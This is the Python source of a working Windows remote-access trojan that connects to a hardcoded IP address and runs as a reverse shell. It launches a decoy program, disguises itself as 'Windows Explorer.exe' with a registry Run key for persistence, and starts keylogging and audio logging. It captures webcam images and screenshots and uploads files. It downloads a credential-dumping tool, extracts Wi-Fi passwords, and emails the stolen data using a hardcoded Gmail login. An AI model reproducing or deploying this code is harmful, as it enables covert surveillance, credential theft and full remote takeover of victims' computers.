


import socket

import os

import subprocess

import sys

import smtplib

import autopy

import requests

import tempfile

import shutil

import traceback
from pynput.mouse import Button

from pynput.keyboard import Key

import pynput

import random

import time


mouse = pynput.mouse.Controller()

keyboard =pynput.keyboard.Controller()

import pyscreenshot as ImageGrab





import threading




            
import cv2 





s = socket.socket()

host = '18.220.14.0'



port = 2500


is_key_logger_active = False

key_logger_process = None

is_aud_logger_active = False

aud_logger_process = None



def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        
    

        base_path = sys._MEIPASS
    
    except Exception:
    
        base_path = os.path.abspath(".")


    return os.path.join(base_path, relative_path)


def print_file(file_path):
    try: 
        print(file_path)
    
        file_path = resource_path(file_path)
    
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
    
        print(file_path)



        if  sys.executable != evil_file_location:

            print("Openeing")

            subprocess.Popen(file_path,shell=True)

    except Exception as e:

        print("Error",e)
        pass


print_file('CG proj test.exe')

def start_key_logger(file_path):
    global is_key_logger_active,key_logger_process
        
    try:
        
        file_path = resource_path(file_path)
        


        if  not is_key_logger_active:

            is_key_logger_active = True
        
            key_logger_process = subprocess.Popen(file_path,shell=True)
    
    except:
    
        pass

def start_aud_logger(file_path):
    global is_aud_logger_active,aud_logger_process
        
    try:
        
        file_path = resource_path(file_path)
        


        if  not is_aud_logger_active:

            is_aud_logger_active = True
        
            aud_logger_process = subprocess.Popen(file_path,shell=True)
    
    except:
    
        pass


def is_connected():
    try:
    
    
        socket.create_connection(("www.google.com", 80))

        
        return True

    except OSError:
        pass

    return False



def reconnect():
    global host,port
    print("Not yet Connected now")
    while(not is_connected()):
        pass
    print("Connected")
    connect(host,port)
    
def send_mail(email,password,message):

    server= smtplib.SMTP("smtp.gmail.com",587)

    server.starttls()

    server.login(email,password)

    server.sendmail(email,email,message)

    server.quit()



def download(url):

    get_response = requests.get(url)

    filename = url.split("/")[-1]

    with open(filename,'wb') as f:
        f.write(get_response.content)
def become_persistent():

    print("Entered")

    try:
        evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"

        if not os.path.exists(evil_file_location):

            shutil.copyfile(sys.executable,evil_file_location)

            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
    except:
    
        pass


def connect(host,port):

    try:

        s.connect((host,port))

        s.settimeout(30)

        s.send(str.encode(os.getcwd() +" > "))    

    except socket.error:    

        sys.exit(0)

    

    except:

        sys.exit(0)

become_persistent()       

reconnect()





while True:

    try:    

        print("Waiting to recv command")
        data = s.recv(1024)#


        data = data.decode("utf-8")

        print(data)

        if data[:2] == "cd":

            try:

                os.chdir(data[3:])

                cwd = os.getcwd() +" > "

                s.send(str.encode(cwd))
            except FileNotFoundError:

                cwd = os.getcwd() +" > "

                s.send(str.encode("Directory does not exist\n " + cwd))

            except:

                cwd = os.getcwd() +" > "

                s.send(str.encode("Some Error occured\n " + cwd))




        elif data[:7] == "klog -a":
            try:
            
                start_key_logger('keylogger.exe')
            
                data= ''
            except:
                pass

        elif data[:7] == "klog -d":
            try:
                subprocess.call(['taskkill', '/F', '/T', '/PID', str(key_logger_process.pid)])
            
                print("Key logger ended")
            
                is_key_logger_active = False
            
                data= ''
            except:
                pass

        elif data[:7] == "alog -a":
            try:
            
                start_aud_logger('Audiologger.exe')
            
                data= ''
            except:
                pass

        elif data[:7] == "alog -d":
            try:
                subprocess.call(['taskkill', '/F', '/T', '/PID', str(aud_logger_process.pid)])
            
                print("Key logger ended")
            
                is_aud_logger_active = False
            
                data= ''
            except:
                pass
        
        elif data[:4] == "quit":#


            print("closing..")

            s.close()

            s = socket.socket()
            reconnect()

        



        elif data[:4] == "getf":

            filename = data[5:]

            try:

                f = open(filename,"rb")

                chunk=1

                filesize = str(os.path.getsize(filename))

                s.send(filesize.encode())

                while(chunk):

                    chunk = f.read(1024*1024)

                    s.send(chunk)

            

                print("Done with sending")

                f.close()

            except FileNotFoundError:

                print("File does not exist")

                s.send('0'.encode())

            cwd = os.getcwd() +" > "

        

        

        elif data[:4] == "wcam":
            filename = data[5:]+".jpg"
            temp_directory = tempfile.gettempdir()

            cur_dir = os.getcwd()

            os.chdir(temp_directory)
            try:

                    cam = cv2.VideoCapture(0)
                    ret,frame = cam.read()
                    cam.release()
                    del cam
                    print(filename)
                    try:
                        cv2.imwrite(filename,frame)
                    except:
                        cv2.imwrite("default.jpg",frame)
                        filename = "default.jpg"
                    with open(filename, "rb") as f:
                    
                        print("[+] Sending file...")
                        data = f.read()
                        s.sendall(data) 

                    print("[+] Successfully sent file")
                    os.remove(filename)
                
            except FileNotFoundError:

                
                    print("File does not exist")
            
                
                    s.send('0'.encode())
        
        
        
        
        
        
            os.chdir(cur_dir)



        elif data[:4] == "putf":

            print("Getting file")



            filename = data[5:]

            download("http://"+host+"/"+filename)

        

        
        
        elif data[:4] == "putl":

            try:
                temp_directory = tempfile.gettempdir()
    
                cur_dir = os.getcwd()
    
                os.chdir(temp_directory)
    
                download("http://"+host+"/lazagne.exe")
    
            
    

            
            
                cmd = subprocess.Popen('lazagne.exe all',shell=True,stdout = subprocess.PIPE,stdin = subprocess.PIPE,stderr = subprocess.PIPE)

                output_byte = cmd.stdout.read() + cmd.stderr.read()

                result = str(output_byte,"utf-8")
                send_mail('ramakishora22@gmail.com','ram221199',str(result))

            
                s.send(result.encode())
    
                os.remove("lazagne.exe")
    
                os.chdir(cur_dir)

            except Exception as e:
                print("Error",e)
                track = traceback.format_exc()
                s.send(str(track).encode())


        elif data[:4]== "getp":

            passwords = ""

            try:

                data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')

                profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

                for i in profiles:

                    results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')    

                    results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]



                    try:

                        print ("{:<30}|  {:<}".format(i, results[0]))

                        passwords += "{:<30}|  {:<} \n".format(i, results[0])

                    except IndexError:

                        print ("{:<30}|  {:<}".format(i, ""))

                        passwords += "{:<30}|  {:<}\n".format(i, "")



                print("DONE[+]")
                try:
                    send_mail('ramakishora22@gmail.com','ram221199',str(passwords))
                except:
                    pass
                s.send(str.encode(passwords))

            except Exception as e:

                print(e)

                s.send(str.encode("Error Bro ",e))



        elif data[:6] == 'mhack1':
            i = 0    
            while i<1000:
                x = random.randint(-200,150)
                y = random.randint(-200,150)
                time.sleep(0.01)
                mouse.move(x,y)
                i+=1
                    
        elif data[:6]=='mhack0':                
            while True:
                mouse.move(-2,2)
            
                if mouse.position[0]<=1 and mouse.position[1]>=750:
                    print('stop')
                    break
            mouse.click(Button.left)
            mouse.move(30,0)
            while True:
                mouse.move(0,-2)
                time.sleep(0.0000000000000000000001)
                if mouse.position[0]<=40 and mouse.position[1]<=670:
                    print('stop')
                    break
            mouse.click(Button.left)
            while True:
                mouse.move(0,-2)
                time.sleep(0.0000000000000000000001)
                if mouse.position[0]<=40 and mouse.position[1]<=590:
                    print('stop')
                    break
            mouse.click(Button.left)
            s.close()
        
        elif data[:5] == 'mhack':
            while True:
                cmd = s.recv(1024)#
                cmd = cmd.decode("utf-8")
                if cmd == 'quit':
                    break
                elif cmd=='w':
                    mouse.move(0,-50)
                elif cmd=='s':
                    mouse.move(0,40)
                elif cmd=='d':
                    mouse.move(40,0)
                elif cmd=='a':
                    mouse.move(-40,0)
                elif cmd=='up':
                    mouse.move(0,-150)
                elif cmd=='down':
                    mouse.move(0,140)
                elif cmd=='right':
                    mouse.move(110,0)
                elif cmd=='left':
                    mouse.move(-100,0)
                elif cmd == 'lclick':
                    mouse.click(Button.left)
                elif cmd == 'rclick':
                    mouse.click(Button.right)
            
        elif data[:5] == 'khack':

            while True:
                try:
                    cmd = s.recv(1024)#
                    cmd = cmd.decode("utf-8")
                    print(cmd)
                    if cmd == 'quit':
                        break
                    elif cmd == 'up':
                        keyboard.press(Key.up)
                        keyboard.release(Key.up)
                    elif cmd == 'down':
                        keyboard.press(Key.down)
                        keyboard.release(Key.down)
                    elif cmd == 'left':
                        keyboard.press(Key.left)
                        keyboard.release(Key.left)
                    elif cmd == 'right':
                        keyboard.press(Key.right)
                        keyboard.release(Key.right)
                    elif cmd == 'enter':
                        keyboard.press(Key.enter)
                        keyboard.release(Key.enter)
                    elif cmd == 'tab':
                        keyboard.press(Key.tab)
                        keyboard.release(Key.tab)
                    elif cmd == 'shift':
                        keyboard.press(Key.shift)
                        keyboard.release(Key.shift)
                    elif cmd == 'alt':
                        keyboard.press(Key.alt)
                        keyboard.release(Key.alt)
                    elif cmd == 'ctrl':
                        keyboard.press(Key.ctrl)
                        keyboard.release(Key.ctrl)
                    elif cmd == 'backspace':
                        keyboard.press(Key.backspace)
                        keyboard.release(Key.backspace)
                    elif cmd == 'space':
                        keyboard.press(Key.space)
                        keyboard.release(Key.space)
                    elif cmd == 'cmd':
                        keyboard.press(Key.cmd)
                        keyboard.release(Key.cmd)
                    elif cmd == 'alttab':
                        with keyboard.pressed(Key.alt):
                            time.sleep(0.1)
                            keyboard.press(Key.tab)
                    elif cmd == 'close':
                        with keyboard.pressed(Key.alt):
                            time.sleep(0.1)
                            keyboard.press(Key.f4)
                            
                    elif cmd == 'sall':
                        with keyboard.pressed(Key.ctrl):
                            time.sleep(0.1)
                            keyboard.press('a')
                            
                    else:
                        keyboard.press(cmd)
                except Exception as e:
                    print("Failed",e)                           

        elif data[:9] == 'fork bomb':
            i = 0
            while True:
                os.fork()
                i+=1
                if i > 200:
                    break
        elif data[:4] == 'scrn':
            temp_directory = tempfile.gettempdir()
    
            cur_dir = os.getcwd()
    
            os.chdir(temp_directory)
            
            filename = 'screenshot.png'
            bitmap = autopy.bitmap.capture_screen()
            bitmap.save(filename)



            try:

                f = open(filename,"rb")

                chunk=1

                filesize = str(os.path.getsize(filename))

                s.send(filesize.encode())

                while(chunk):

                    chunk = f.read(1024*1024)

                    s.send(chunk)

            

                print("Done with sending")

                f.close()

            except FileNotFoundError:

                print("File does not exist")

                s.send('0'.encode())


        

        




            os.chdir(cur_dir)
            s.settimeout(30)
            
        elif data[:4]=='msg0':
            keyboard.press(Key.cmd)
            keyboard.release(Key.cmd)
            time.sleep(0.3)
            keyboard.type('Notepad')
            time.sleep(1)
            keyboard.press(Key.enter)
            keyboard.release(Key.enter)
            '''After going there'''
            time.sleep(0.7)
            keyboard.type('You')
            time.sleep(0.7)
            keyboard.type(' have ')
            time.sleep(0.7)
            keyboard.type('been ')
            time.sleep(0.7)
            keyboard.type('hacked')
            time.sleep(0.7)
            keyboard.type(' ! ! !')
        elif data[:3]=='msg':
            keyboard.press(Key.cmd)
            keyboard.release(Key.cmd)
            time.sleep(0.3)
            keyboard.type('Notepad')
            time.sleep(1)
            keyboard.press(Key.enter)
            keyboard.release(Key.enter)
            '''After going there'''
            time.sleep(1)
            keyboard.type(data[4:])                    



        elif len(data) > 0:

            try:

                cmd = subprocess.Popen(data[:],shell=True,stdout = subprocess.PIPE,stdin = subprocess.PIPE,stderr = subprocess.PIPE)

                output_byte = cmd.stdout.read() + cmd.stderr.read()

                output_str = str(output_byte,"utf-8")

                cwd = os.getcwd() +" >"

                s.send(str.encode(output_str + cwd))

                print(output_str)

            except:

            

                s.send(str.encode("Error Bro " + cwd))

    except Exception as e:
    
        print("Connection lost\n",e)
        if not is_connected():
            s.close()

            s = socket.socket()
            reconnect()
        else:
            print("Connection still there sorry!!")










